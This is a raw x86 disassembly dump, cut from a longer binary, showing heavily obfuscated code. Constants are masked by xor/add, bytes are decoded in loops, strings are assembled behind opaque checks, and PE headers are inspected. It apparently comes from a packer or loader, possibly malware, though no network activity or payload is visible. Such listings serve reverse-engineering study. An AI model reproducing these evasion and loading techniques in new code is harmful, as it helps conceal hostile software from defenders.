  4268d6:	cmp    eax,ecx
  4268d8:	jbe    0x4266ea
  4268de:	mov    eax,DWORD PTR [ebp-0x10]
  4268e1:	mov    ecx,DWORD PTR [ebp-0x40]
  4268e4:	mov    eax,DWORD PTR [ebp+0x8]
  4268e7:	mov    edx,DWORD PTR [ebp-0x54]
  4268ea:	mov    eax,DWORD PTR [eax+0x1e0]
  4268f0:	xor    edx,ebx
  4268f2:	add    edx,esi
  4268f4:	push   edx
  4268f5:	mov    edx,DWORD PTR [ebp-0x3c]
  4268f8:	xor    edx,ebx
  4268fa:	add    edx,esi
  4268fc:	push   edx
  4268fd:	push   ecx
  4268fe:	mov    DWORD PTR [ebp-0x30],ecx
  426901:	mov    ecx,DWORD PTR [ebp-0x10]
  426904:	xor    ecx,ebx
  426906:	add    ecx,esi
  426908:	push   ecx
  426909:	call   DWORD PTR [eax+0x14]
  42690c:	mov    edi,eax
  42690e:	mov    eax,DWORD PTR [ebp-0x10]
  426911:	xor    eax,ebx
  426913:	add    eax,esi
  426915:	cmp    eax,edi
  426917:	je     0x426972
  426919:	mov    eax,DWORD PTR [ebp-0x10]
  42691c:	jmp    0x42693f
  42691e:	mov    ecx,DWORD PTR [ebp-0x24]
  426921:	xor    eax,ebx
  426923:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f5]
  42692a:	mov    BYTE PTR [eax+edi*1+0x3272f5],cl
  426931:	mov    ecx,DWORD PTR [ebp-0x18]
  426934:	xor    ecx,ebx
  426936:	lea    eax,[ecx+eax*1+0x3272f5]
  42693d:	xor    eax,ebx
  42693f:	mov    ecx,DWORD PTR [ebp-0x40]
  426942:	sub    ecx,esi
  426944:	xor    ecx,ebx
  426946:	cmp    eax,ecx
  426948:	jne    0x42691e
  42694a:	mov    eax,DWORD PTR [ebp+0x8]
  42694d:	mov    ecx,DWORD PTR [ebp-0x50]
  426950:	mov    eax,DWORD PTR [eax+0x1e0]
  426956:	xor    ecx,ebx
  426958:	add    ecx,esi
  42695a:	push   ecx
  42695b:	mov    ecx,DWORD PTR [ebp-0x10]
  42695e:	xor    ecx,ebx
  426960:	add    ecx,esi
  426962:	push   ecx
  426963:	push   DWORD PTR [ebp-0x24]
  426966:	call   DWORD PTR [eax+0x18]
  426969:	mov    eax,DWORD PTR [ebp-0x30]
  42696c:	mov    DWORD PTR [ebp-0x24],edi
  42696f:	mov    DWORD PTR [ebp-0x40],eax
  426972:	mov    edi,DWORD PTR [ebp-0x24]
  426975:	mov    eax,DWORD PTR [ebp-0x18]
  426978:	mov    ecx,DWORD PTR [ebp-0x10]
  42697b:	xor    eax,ebx
  42697d:	mov    DWORD PTR [ebp-0x30],edi
  426980:	add    eax,esi
  426982:	mov    DWORD PTR [ebp-0x5c],0x402b332b
  426989:	mov    DWORD PTR [ebp-0x58],0x362b3e2b
  426990:	jmp    0x4269c4
  426992:	xor    ecx,ebx
  426994:	mov    dl,BYTE PTR [ebp+ecx*1+0x327299]
  42699b:	xor    dl,0x7e
  42699e:	add    dl,0x3
  4269a1:	mov    DWORD PTR [ebp-0x3c],ecx
  4269a4:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272f5]
  4269ac:	movzx  edx,dl
  4269af:	cmp    ecx,edx
  4269b1:	jne    0x4269ce
  4269b3:	mov    ecx,DWORD PTR [ebp-0x18]
  4269b6:	mov    edx,DWORD PTR [ebp-0x3c]
  4269b9:	xor    ecx,ebx
  4269bb:	lea    ecx,[ecx+edx*1+0x3272f5]
  4269c2:	xor    ecx,ebx
  4269c4:	cmp    ecx,0xf89c85bd
  4269ca:	jne    0x426992
  4269cc:	jmp    0x4269d5
  4269ce:	mov    eax,DWORD PTR [ebp-0x10]
  4269d1:	xor    eax,ebx
  4269d3:	add    eax,esi
  4269d5:	mov    ecx,DWORD PTR [ebp-0x10]
  4269d8:	xor    ecx,ebx
  4269da:	add    ecx,esi
  4269dc:	cmp    ecx,eax
  4269de:	je     0x426b51
  4269e4:	mov    eax,DWORD PTR [edi+0x8]
  4269e7:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4269ee:	mov    DWORD PTR [ebp-0x3c],0xf89cc3d4
  4269f5:	mov    DWORD PTR [ebp-0x48],0xf89cb5a5
  4269fc:	mov    DWORD PTR [ebp-0x20],0xf89c85a1
  426a03:	mov    DWORD PTR [ebp-0x14],eax
  426a06:	mov    eax,DWORD PTR [ebp+0x8]
  426a09:	mov    ecx,DWORD PTR [ebp-0x20]
  426a0c:	xor    ecx,ebx
  426a0e:	add    ecx,esi
  426a10:	push   ecx
  426a11:	mov    ecx,DWORD PTR [ebp-0x48]
  426a14:	mov    eax,DWORD PTR [eax+0x1e0]
  426a1a:	xor    ecx,ebx
  426a1c:	add    ecx,esi
  426a1e:	push   ecx
  426a1f:	mov    ecx,DWORD PTR [ebp-0x3c]
  426a22:	xor    ecx,ebx
  426a24:	add    ecx,esi
  426a26:	push   ecx
  426a27:	mov    ecx,DWORD PTR [ebp-0xc]
  426a2a:	xor    ecx,ebx
  426a2c:	add    ecx,esi
  426a2e:	push   ecx
  426a2f:	call   DWORD PTR [eax+0x14]
  426a32:	mov    edi,eax
  426a34:	mov    eax,DWORD PTR [ebp+0x8]
  426a37:	mov    ecx,DWORD PTR [ebp-0x20]
  426a3a:	mov    eax,DWORD PTR [eax+0x1e0]
  426a40:	xor    ecx,ebx
  426a42:	add    ecx,esi
  426a44:	push   ecx
  426a45:	mov    ecx,DWORD PTR [ebp-0x48]
  426a48:	xor    ecx,ebx
  426a4a:	add    ecx,esi
  426a4c:	push   ecx
  426a4d:	mov    ecx,DWORD PTR [ebp-0xc]
  426a50:	push   DWORD PTR [ebp-0x14]
  426a53:	xor    ecx,ebx
  426a55:	add    ecx,esi
  426a57:	push   ecx
  426a58:	call   DWORD PTR [eax+0x14]
  426a5b:	mov    ecx,DWORD PTR [ebp-0xc]
  426a5e:	xor    ecx,ebx
  426a60:	add    ecx,esi
  426a62:	mov    DWORD PTR [ebp-0x20],eax
  426a65:	cmp    ecx,edi
  426a67:	je     0x426df4
  426a6d:	mov    ecx,DWORD PTR [ebp-0xc]
  426a70:	xor    ecx,ebx
  426a72:	add    ecx,esi
  426a74:	cmp    ecx,eax
  426a76:	je     0x426df4
  426a7c:	mov    DWORD PTR [ebp-0x3c],0xf89c85a0
  426a83:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  426a8a:	mov    ecx,DWORD PTR [ebp-0x3c]
  426a8d:	xor    cl,0xae
  426a90:	sub    cl,0xb
  426a93:	mov    BYTE PTR [edi],cl
  426a95:	mov    ecx,DWORD PTR [ebp-0xc]
  426a98:	xor    cl,0xae
  426a9b:	sub    cl,0xb
  426a9e:	mov    BYTE PTR [edi+0x1],cl
  426aa1:	mov    ecx,DWORD PTR [ebp-0x54]
  426aa4:	xor    cl,0xae
  426aa7:	sub    cl,0xb
  426aaa:	mov    BYTE PTR [edi+0x2],cl
  426aad:	and    DWORD PTR [ebp-0xc8],0x0
  426ab4:	and    DWORD PTR [ebp-0xdc],0x0
  426abb:	lea    ecx,[ebp-0xdc]
  426ac1:	push   ecx
  426ac2:	push   DWORD PTR [ebp-0x14]
  426ac5:	push   eax
  426ac6:	lea    eax,[ebp-0xc8]
  426acc:	push   eax
  426acd:	mov    eax,DWORD PTR [ebp-0x30]
  426ad0:	push   DWORD PTR [eax+0xc]
  426ad3:	mov    eax,DWORD PTR [ebp-0x24]
  426ad6:	add    eax,0x10
  426ad9:	push   eax
  426ada:	push   edi
  426adb:	call   0x425d81
  426ae0:	mov    DWORD PTR [ebp-0x3c],eax
  426ae3:	mov    eax,DWORD PTR [ebp+0x8]
  426ae6:	mov    ecx,DWORD PTR [ebp-0x50]
  426ae9:	mov    eax,DWORD PTR [eax+0x1e0]
  426aef:	xor    ecx,ebx
  426af1:	add    ecx,esi
  426af3:	push   ecx
  426af4:	mov    ecx,DWORD PTR [ebp-0xc]
  426af7:	xor    ecx,ebx
  426af9:	add    ecx,esi
  426afb:	push   ecx
  426afc:	push   edi
  426afd:	call   DWORD PTR [eax+0x18]
  426b00:	mov    eax,DWORD PTR [ebp-0x3c]
  426b03:	add    eax,0xffcd8d0b
  426b08:	xor    eax,ebx
  426b0a:	cmp    eax,0xf89c85a5
  426b0f:	mov    eax,DWORD PTR [ebp+0x8]
  426b12:	mov    eax,DWORD PTR [eax+0x1e0]
  426b18:	mov    ecx,DWORD PTR [ebp-0x50]
  426b1b:	jne    0x426b3e
  426b1d:	xor    ecx,ebx
  426b1f:	add    ecx,esi
  426b21:	push   ecx
  426b22:	mov    ecx,DWORD PTR [ebp-0xc]
  426b25:	xor    ecx,ebx
  426b27:	add    ecx,esi
  426b29:	push   ecx
  426b2a:	push   DWORD PTR [ebp-0x24]
  426b2d:	call   DWORD PTR [eax+0x18]
  426b30:	mov    eax,DWORD PTR [ebp-0x20]
  426b33:	mov    DWORD PTR [ebp-0x24],eax
  426b36:	mov    eax,DWORD PTR [ebp-0x14]
  426b39:	mov    DWORD PTR [ebp-0x40],eax
  426b3c:	jmp    0x426b51
  426b3e:	xor    ecx,ebx
  426b40:	add    ecx,esi
  426b42:	push   ecx
  426b43:	mov    ecx,DWORD PTR [ebp-0xc]
  426b46:	xor    ecx,ebx
  426b48:	add    ecx,esi
  426b4a:	push   ecx
  426b4b:	push   DWORD PTR [ebp-0x20]
  426b4e:	call   DWORD PTR [eax+0x18]
  426b51:	mov    eax,DWORD PTR [ebp-0x40]
  426b54:	mov    DWORD PTR [ebp-0x38],eax
  426b57:	mov    eax,DWORD PTR [ebp-0x24]
  426b5a:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  426b61:	mov    DWORD PTR [ebp-0x3c],eax
  426b64:	mov    edi,0xf89c85a2
  426b69:	mov    DWORD PTR [ebp-0x2c],edi
  426b6c:	mov    eax,DWORD PTR [ebp-0x28]
  426b6f:	xor    eax,ebx
  426b71:	add    eax,esi
  426b73:	mov    DWORD PTR [ebp-0xc],eax
  426b76:	mov    eax,DWORD PTR [ebp-0x28]
  426b79:	xor    eax,ebx
  426b7b:	add    eax,esi
  426b7d:	mov    DWORD PTR [ebp-0x14],eax
  426b80:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  426b87:	mov    DWORD PTR [ebp-0x20],0xf89c85bc
  426b8e:	mov    eax,DWORD PTR [ebp-0x28]
  426b91:	mov    ecx,DWORD PTR [ebp-0x38]
  426b94:	xor    eax,ebx
  426b96:	add    eax,esi
  426b98:	cmp    ecx,eax
  426b9a:	je     0x426d90
  426ba0:	jmp    0x426d6c
  426ba5:	mov    ecx,DWORD PTR [ebp-0xc]
  426ba8:	mov    eax,DWORD PTR [ebp-0x38]
  426bab:	sub    eax,ecx
  426bad:	mov    ecx,DWORD PTR [ebp-0x48]
  426bb0:	xor    ecx,ebx
  426bb2:	add    ecx,esi
  426bb4:	xor    edx,edx
  426bb6:	div    ecx
  426bb8:	mov    DWORD PTR [ebp-0x14],eax
  426bbb:	mov    eax,DWORD PTR [ebp-0x20]
  426bbe:	mov    ecx,DWORD PTR [ebp-0x14]
  426bc1:	xor    eax,ebx
  426bc3:	add    eax,esi
  426bc5:	cmp    ecx,eax
  426bc7:	jbe    0x426bd3
  426bc9:	mov    eax,DWORD PTR [ebp-0x20]
  426bcc:	xor    eax,ebx
  426bce:	add    eax,esi
  426bd0:	mov    DWORD PTR [ebp-0x14],eax
  426bd3:	mov    eax,DWORD PTR [ebp-0x48]
  426bd6:	mov    ecx,DWORD PTR [ebp-0x14]
  426bd9:	xor    eax,ebx
  426bdb:	add    eax,esi
  426bdd:	imul   eax,ecx
  426be0:	mov    DWORD PTR [ebp-0x14],eax
  426be3:	mov    eax,DWORD PTR [ebp-0x28]
  426be6:	mov    ecx,DWORD PTR [ebp-0x14]
  426be9:	xor    eax,ebx
  426beb:	add    eax,esi
  426bed:	cmp    ecx,eax
  426bef:	je     0x426d5a
  426bf5:	mov    eax,DWORD PTR [ebp-0x14]
  426bf8:	mov    DWORD PTR [ebp-0x34],eax
  426bfb:	mov    eax,DWORD PTR [ebp-0xc]
  426bfe:	add    eax,DWORD PTR [ebp-0x3c]
  426c01:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  426c08:	mov    DWORD PTR [ebp-0x14],edi
  426c0b:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  426c12:	mov    DWORD PTR [ebp-0x1c],eax
  426c15:	mov    DWORD PTR [ebp-0x30],0xf89c85a0
  426c1c:	mov    DWORD PTR [ebp-0x8],edi
  426c1f:	mov    eax,DWORD PTR [ebp-0x4c]
  426c22:	xor    eax,ebx
  426c24:	add    eax,esi
  426c26:	jmp    0x426d19
  426c2b:	mov    DWORD PTR [ebp-0xe4],0xf89c85b8
  426c35:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  426c3f:	mov    eax,DWORD PTR [ebp-0x8]
  426c42:	mov    ecx,DWORD PTR [ebp-0x18]
  426c45:	xor    eax,ebx
  426c47:	add    eax,esi
  426c49:	imul   eax,ecx
  426c4c:	mov    ecx,DWORD PTR [ebp-0x1c]
  426c4f:	mov    al,BYTE PTR [eax+ecx*1]
  426c52:	mov    BYTE PTR [ebp-0x1],al
  426c55:	mov    eax,DWORD PTR [ebp-0x8]
  426c58:	mov    ecx,DWORD PTR [ebp-0x18]
  426c5b:	xor    eax,ebx
  426c5d:	add    eax,esi
  426c5f:	imul   eax,ecx
  426c62:	mov    ecx,DWORD PTR [ebp-0x54]
  426c65:	xor    ecx,ebx
  426c67:	add    eax,ecx
  426c69:	mov    ecx,DWORD PTR [ebp-0x1c]
  426c6c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  426c74:	mov    ecx,DWORD PTR [ebp-0xe4]
  426c7a:	xor    ecx,ebx
  426c7c:	lea    eax,[ecx+eax*1+0x3272f5]
  426c83:	movzx  ecx,BYTE PTR [ebp-0x1]
  426c87:	xor    ecx,eax
  426c89:	mov    BYTE PTR [ebp-0x1],cl
  426c8c:	mov    al,BYTE PTR [ebp-0x1]
  426c8f:	mov    ecx,DWORD PTR [ebp-0x8]
  426c92:	mov    edx,DWORD PTR [ebp-0x18]
  426c95:	xor    ecx,ebx
  426c97:	add    ecx,esi
  426c99:	imul   ecx,edx
  426c9c:	mov    edx,DWORD PTR [ebp-0x1c]
  426c9f:	mov    BYTE PTR [ecx+edx*1],al
  426ca2:	mov    eax,DWORD PTR [ebp-0x8]
  426ca5:	mov    ecx,DWORD PTR [ebp-0x18]
  426ca8:	xor    eax,ebx
  426caa:	add    eax,esi
  426cac:	imul   eax,ecx
  426caf:	mov    ecx,DWORD PTR [ebp-0x1c]
  426cb2:	mov    al,BYTE PTR [eax+ecx*1]
  426cb5:	mov    BYTE PTR [ebp-0x1],al
  426cb8:	mov    eax,DWORD PTR [ebp-0x8]
  426cbb:	mov    ecx,DWORD PTR [ebp-0x18]
  426cbe:	xor    eax,ebx
  426cc0:	add    eax,esi
  426cc2:	imul   eax,ecx
  426cc5:	mov    ecx,DWORD PTR [ebp-0x14]
  426cc8:	xor    ecx,ebx
  426cca:	add    eax,ecx
  426ccc:	mov    ecx,DWORD PTR [ebp-0x1c]
  426ccf:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  426cd7:	mov    ecx,DWORD PTR [ebp-0xd0]
  426cdd:	xor    ecx,ebx
  426cdf:	lea    eax,[ecx+eax*1+0x3272f5]
  426ce6:	movzx  ecx,BYTE PTR [ebp-0x1]
  426cea:	xor    ecx,eax
  426cec:	mov    BYTE PTR [ebp-0x1],cl
  426cef:	mov    al,BYTE PTR [ebp-0x1]
  426cf2:	mov    ecx,DWORD PTR [ebp-0x8]
  426cf5:	mov    edx,DWORD PTR [ebp-0x18]
  426cf8:	xor    ecx,ebx
  426cfa:	add    ecx,esi
  426cfc:	imul   ecx,edx
  426cff:	mov    edx,DWORD PTR [ebp-0x1c]
  426d02:	mov    BYTE PTR [ecx+edx*1],al
  426d05:	mov    eax,DWORD PTR [ebp-0x30]
  426d08:	mov    ecx,DWORD PTR [ebp-0x14]
  426d0b:	xor    eax,ebx
  426d0d:	xor    ecx,ebx
  426d0f:	add    eax,esi
  426d11:	add    ecx,esi
  426d13:	imul   eax,ecx
  426d16:	add    eax,DWORD PTR [ebp-0x18]
  426d19:	mov    DWORD PTR [ebp-0x18],eax
  426d1c:	mov    eax,DWORD PTR [ebp-0x18]
  426d1f:	mov    ecx,DWORD PTR [ebp-0x34]
  426d22:	cmp    ecx,eax
  426d24:	jb     0x426c2b
  426d2a:	mov    eax,DWORD PTR [ebp-0x14]
  426d2d:	mov    ecx,DWORD PTR [ebp-0x34]
  426d30:	xor    eax,ebx
  426d32:	add    eax,esi
  426d34:	imul   eax,ecx
  426d37:	mov    ecx,DWORD PTR [ebp-0x4c]
  426d3a:	xor    ecx,ebx
  426d3c:	add    ecx,esi
  426d3e:	or     eax,ecx
  426d40:	mov    ecx,DWORD PTR [ebp-0x2c]
  426d43:	xor    ecx,ebx
  426d45:	add    eax,ecx
  426d47:	mov    ecx,DWORD PTR [ebp-0x2c]
  426d4a:	xor    ecx,ebx
  426d4c:	add    eax,ecx
  426d4e:	mov    ecx,DWORD PTR [ebp-0xc]
  426d51:	lea    eax,[eax+ecx*1+0x64e5ea]
  426d58:	jmp    0x426d69
  426d5a:	mov    eax,DWORD PTR [ebp-0x2c]
  426d5d:	mov    ecx,DWORD PTR [ebp-0xc]
  426d60:	xor    eax,ebx
  426d62:	lea    eax,[eax+ecx*1+0x3272f5]
  426d69:	mov    DWORD PTR [ebp-0xc],eax
  426d6c:	mov    eax,DWORD PTR [ebp-0x2c]
  426d6f:	xor    eax,ebx
  426d71:	mov    ecx,0xffcd8d0b
  426d76:	sub    ecx,eax
  426d78:	add    ecx,DWORD PTR [ebp-0x38]
  426d7b:	mov    eax,DWORD PTR [ebp-0x2c]
  426d7e:	mov    edx,DWORD PTR [ebp-0xc]
  426d81:	xor    eax,ebx
  426d83:	add    eax,esi
  426d85:	imul   eax,edx
  426d88:	cmp    eax,ecx
  426d8a:	jbe    0x426ba5
  426d90:	push   DWORD PTR [ebp+0x8]
  426d93:	mov    eax,DWORD PTR [ebp+0x8]
  426d96:	push   DWORD PTR [eax+0x1cc]
  426d9c:	lea    eax,[ebp-0xd8]
  426da2:	push   eax
  426da3:	mov    eax,DWORD PTR [ebp+0x8]
  426da6:	mov    eax,DWORD PTR [eax+0x1c4]
  426dac:	push   DWORD PTR [eax]
  426dae:	mov    eax,DWORD PTR [ebp+0x8]
  426db1:	mov    eax,DWORD PTR [eax+0x1c0]
  426db7:	push   DWORD PTR [eax]
  426db9:	push   DWORD PTR [ebp-0x40]
  426dbc:	push   DWORD PTR [ebp-0x24]
  426dbf:	call   0x427856
  426dc4:	mov    DWORD PTR [ebp-0x3c],eax
  426dc7:	mov    eax,DWORD PTR [ebp-0x10]
  426dca:	mov    ecx,DWORD PTR [ebp-0x24]
  426dcd:	xor    eax,ebx
  426dcf:	add    eax,esi
  426dd1:	cmp    eax,ecx
  426dd3:	je     0x426df4
  426dd5:	mov    eax,DWORD PTR [ebp+0x8]
  426dd8:	mov    ecx,DWORD PTR [ebp-0x50]
  426ddb:	mov    eax,DWORD PTR [eax+0x1e0]
  426de1:	xor    ecx,ebx
  426de3:	add    ecx,esi
  426de5:	push   ecx
  426de6:	mov    ecx,DWORD PTR [ebp-0x10]
  426de9:	xor    ecx,ebx
  426deb:	add    ecx,esi
  426ded:	push   ecx
  426dee:	push   DWORD PTR [ebp-0x24]
  426df1:	call   DWORD PTR [eax+0x18]
  426df4:	pop    edi
  426df5:	pop    esi
  426df6:	pop    ebx
  426df7:	leave  
  426df8:	ret    0x4
  426dfb:	push   ebp
  426dfc:	mov    ebp,esp
  426dfe:	push   ecx
  426dff:	push   ecx
  426e00:	lea    eax,[ebp-0x8]
  426e03:	mov    DWORD PTR [ebp-0x4],eax
  426e06:	push   esi
  426e07:	mov    esi,DWORD PTR [ebp-0x4]
  426e0a:	mov    eax,0xf881ba2f
  426e0f:	mov    DWORD PTR [esi],eax
  426e11:	mov    esi,DWORD PTR [ebp-0x8]
  426e14:	cmp    esi,eax
  426e16:	pop    esi
  426e17:	jne    0x426e21
  426e19:	mov    BYTE PTR [ecx+0xa],0x83
  426e1d:	mov    BYTE PTR [edx+0x8],0x2e
  426e21:	mov    BYTE PTR [edx+0xa],0x83
  426e25:	mov    BYTE PTR [ecx+0x2],0x15
  426e29:	leave  
  426e2a:	ret    
  426e2b:	push   ebp
  426e2c:	mov    ebp,esp
  426e2e:	push   ecx
  426e2f:	push   ecx
  426e30:	lea    eax,[ebp-0x8]
  426e33:	mov    DWORD PTR [ebp-0x4],eax
  426e36:	mov    edx,DWORD PTR [ebp-0x4]
  426e39:	mov    eax,0xf88b0bcb
  426e3e:	mov    DWORD PTR [edx],eax
  426e40:	mov    edx,DWORD PTR [ebp-0x8]
  426e43:	cmp    edx,eax
  426e45:	jne    0x426e56
  426e47:	mov    eax,DWORD PTR [ebp+0x8]
  426e4a:	mov    BYTE PTR [ecx+0x9],0xf
  426e4e:	mov    BYTE PTR [eax+0x7],0x56
  426e52:	mov    BYTE PTR [ecx+0x6],0xe
  426e56:	mov    BYTE PTR [ecx+0x3],0x1f
  426e5a:	leave  
  426e5b:	ret    0x4
  426e5e:	push   ebp
  426e5f:	mov    ebp,esp
  426e61:	push   ecx
  426e62:	push   ecx
  426e63:	lea    eax,[ebp-0x8]
  426e66:	mov    DWORD PTR [ebp-0x4],eax
  426e69:	mov    edx,DWORD PTR [ebp-0x4]
  426e6c:	mov    eax,0x7e0da2f
  426e71:	mov    DWORD PTR [edx],eax
  426e73:	mov    edx,DWORD PTR [ebp-0x8]
  426e76:	cmp    edx,eax
  426e78:	jne    0x426e7e
  426e7a:	mov    BYTE PTR [ecx+0x7],0x56
  426e7e:	mov    eax,DWORD PTR [ebp+0x8]
  426e81:	mov    BYTE PTR [ecx+0x1],0x18
  426e85:	mov    BYTE PTR [eax+0x9],0x2f
  426e89:	leave  
  426e8a:	ret    0x4
  426e8d:	push   ebp
  426e8e:	mov    ebp,esp
  426e90:	push   ecx
  426e91:	push   ecx
  426e92:	lea    eax,[ebp-0x8]
  426e95:	mov    DWORD PTR [ebp-0x4],eax
  426e98:	push   esi
  426e99:	mov    esi,DWORD PTR [ebp-0x4]
  426e9c:	mov    eax,0x7060e3c
  426ea1:	mov    DWORD PTR [esi],eax
  426ea3:	mov    esi,DWORD PTR [ebp-0x8]
  426ea6:	cmp    esi,eax
  426ea8:	pop    esi
  426ea9:	jne    0x426eb5
  426eab:	mov    BYTE PTR [edx+0x4],0x12
  426eaf:	mov    WORD PTR [ecx+0x3],0x121f
  426eb5:	mov    BYTE PTR [edx],0x3e
  426eb8:	leave  
  426eb9:	ret    
  426eba:	push   ebp
  426ebb:	mov    ebp,esp
  426ebd:	push   ecx
  426ebe:	push   ecx
  426ebf:	lea    eax,[ebp-0x8]
  426ec2:	mov    DWORD PTR [ebp-0x4],eax
  426ec5:	mov    edx,DWORD PTR [ebp-0x4]
  426ec8:	mov    eax,0xf8870b3f
  426ecd:	mov    DWORD PTR [edx],eax
  426ecf:	mov    edx,DWORD PTR [ebp-0x8]
  426ed2:	cmp    edx,eax
  426ed4:	jne    0x426ee1
  426ed6:	mov    eax,DWORD PTR [ebp+0x8]
  426ed9:	mov    BYTE PTR [ecx+0x8],0xe
  426edd:	mov    BYTE PTR [eax+0x1],0x18
  426ee1:	mov    BYTE PTR [ecx+0x5],0xa
  426ee5:	leave  
  426ee6:	ret    0x4
  426ee9:	push   esi
  426eea:	mov    ecx,edi
  426eec:	call   0x426eba
  426ef1:	mov    edx,edi
  426ef3:	mov    ecx,esi
  426ef5:	mov    BYTE PTR [esi],0x1e
  426ef8:	call   0x426e8d
  426efd:	push   esi
  426efe:	mov    ecx,edi
  426f00:	mov    BYTE PTR [esi+0x5],0xa
  426f04:	call   0x426e5e
  426f09:	push   esi
  426f0a:	mov    BYTE PTR [esi+0x6],0xe
  426f0e:	call   0x426e2b
  426f13:	mov    BYTE PTR [esi+0x2],0x15
  426f17:	mov    edx,esi
  426f19:	jmp    0x426dfb
  426f1e:	push   ebp
  426f1f:	mov    ebp,esp
  426f21:	push   ecx
  426f22:	mov    ecx,DWORD PTR [edx+0x194]
  426f28:	push   esi
  426f29:	mov    esi,DWORD PTR [ebp+0x8]
  426f2c:	mov    esi,DWORD PTR [esi]
  426f2e:	mov    DWORD PTR [ecx],esi
  426f30:	mov    ecx,DWORD PTR [edx+0x194]
  426f36:	mov    ecx,DWORD PTR [ecx]
  426f38:	mov    esi,DWORD PTR [edx+0x190]
  426f3e:	mov    DWORD PTR [esi],ecx
  426f40:	mov    eax,DWORD PTR [edx+0x194]
  426f46:	mov    ecx,DWORD PTR [eax]
  426f48:	mov    ecx,DWORD PTR [ecx+0x3c]
  426f4b:	add    ecx,DWORD PTR [eax]
  426f4d:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  426f54:	mov    eax,DWORD PTR [ebp-0x4]
  426f57:	movzx  ecx,WORD PTR [ecx+0x16]
  426f5b:	xor    eax,0x75108ae
  426f60:	add    eax,0x3272f5
  426f65:	pop    esi
  426f66:	test   ecx,eax
  426f68:	je     0x426f76
  426f6a:	mov    eax,DWORD PTR [edx+0x1c8]
  426f70:	mov    DWORD PTR [eax],0xf89c85a2
  426f76:	leave  
  426f77:	ret    0x4
  426f7a:	push   ebp
  426f7b:	mov    ebp,esp
  426f7d:	sub    esp,0x70
  426f80:	and    DWORD PTR [ebp-0x20],0x0
  426f84:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  426f8b:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  426f92:	mov    DWORD PTR [ebp-0x2c],0xf89c85a1
  426f99:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  426fa0:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  426fa7:	mov    eax,DWORD PTR [ebp+0x20]
  426faa:	mov    eax,DWORD PTR [eax+0x194]
  426fb0:	mov    DWORD PTR [ebp-0xc],eax
  426fb3:	mov    eax,DWORD PTR [ebp+0x20]
  426fb6:	push   ebx
  426fb7:	push   esi
  426fb8:	mov    esi,DWORD PTR [eax+0x190]
  426fbe:	mov    eax,DWORD PTR [ebp+0x20]
  426fc1:	mov    eax,DWORD PTR [eax+0x18c]
  426fc7:	mov    DWORD PTR [ebp-0x8],eax
  426fca:	mov    eax,DWORD PTR [eax]
  426fcc:	push   edi
  426fcd:	mov    DWORD PTR [ebp-0x4],esi
  426fd0:	test   eax,eax
  426fd2:	jne    0x426fdf
  426fd4:	push   DWORD PTR [ebp+0x1c]
  426fd7:	mov    edx,DWORD PTR [ebp+0x20]
  426fda:	call   0x426f1e
  426fdf:	mov    eax,DWORD PTR [esi]
  426fe1:	mov    ebx,DWORD PTR [esi]
  426fe3:	add    ebx,DWORD PTR [eax+0x3c]
  426fe6:	mov    eax,DWORD PTR [ebp+0xc]
  426fe9:	mov    ecx,DWORD PTR [ebp-0x8]
  426fec:	mov    ecx,DWORD PTR [ecx]
  426fee:	mov    esi,0x75108ae
  426ff3:	xor    eax,esi
  426ff5:	mov    edi,0x3272f5
  426ffa:	add    eax,edi
  426ffc:	cmp    eax,ecx
  426ffe:	jne    0x427236
  427004:	mov    eax,DWORD PTR [ebp-0xc]
  427007:	mov    eax,DWORD PTR [eax]
  427009:	mov    DWORD PTR [ebp-0x10],eax
  42700c:	mov    eax,DWORD PTR [ebx+0x50]
  42700f:	mov    DWORD PTR [ebp-0x68],eax
  427012:	mov    eax,DWORD PTR [ebp-0x18]
  427015:	xor    eax,esi
  427017:	add    eax,edi
  427019:	mov    DWORD PTR [ebp-0x64],eax
  42701c:	mov    eax,DWORD PTR [ebp-0x14]
  42701f:	and    DWORD PTR [ebp-0x6c],0x0
  427023:	xor    eax,esi
  427025:	add    eax,edi
  427027:	mov    DWORD PTR [ebp-0x60],eax
  42702a:	lea    eax,[ebp-0x70]
  42702d:	push   eax
  42702e:	mov    eax,DWORD PTR [ebp+0x8]
  427031:	xor    eax,esi
  427033:	add    eax,edi
  427035:	push   eax
  427036:	mov    eax,DWORD PTR [ebp+0x20]
  427039:	add    eax,0xaa
  42703e:	push   eax
  42703f:	mov    eax,DWORD PTR [ebp+0x20]
  427042:	mov    eax,DWORD PTR [eax+0x198]
  427048:	mov    DWORD PTR [ebp-0x70],0x4
  42704f:	push   DWORD PTR [eax]
  427051:	mov    eax,DWORD PTR [ebp+0x10]
  427054:	call   eax
  427056:	mov    ecx,DWORD PTR [ebp-0xc]
  427059:	mov    ecx,DWORD PTR [ecx]
  42705b:	mov    edx,DWORD PTR [ebp-0x8]
  42705e:	mov    DWORD PTR [ebp-0x6c],eax
  427061:	mov    DWORD PTR [ebp+0x1c],eax
  427064:	mov    DWORD PTR [edx],ecx
  427066:	mov    ecx,DWORD PTR [ebp-0x4]
  427069:	mov    DWORD PTR [ecx],eax
  42706b:	mov    eax,DWORD PTR [ebx+0x50]
  42706e:	mov    DWORD PTR [ebp-0x68],eax
  427071:	mov    eax,DWORD PTR [ebp-0x1c]
  427074:	xor    eax,esi
  427076:	add    eax,edi
  427078:	mov    DWORD PTR [ebp-0x64],eax
  42707b:	lea    eax,[ebp-0x20]
  42707e:	mov    DWORD PTR [ebp-0x60],eax
  427081:	lea    eax,[ebp-0x70]
  427084:	push   eax
  427085:	mov    eax,DWORD PTR [ebp+0x8]
  427088:	xor    eax,esi
  42708a:	add    eax,edi
  42708c:	push   eax
  42708d:	mov    eax,DWORD PTR [ebp+0x20]
  427090:	add    eax,0xee
  427095:	push   eax
  427096:	mov    eax,DWORD PTR [ebp+0x20]
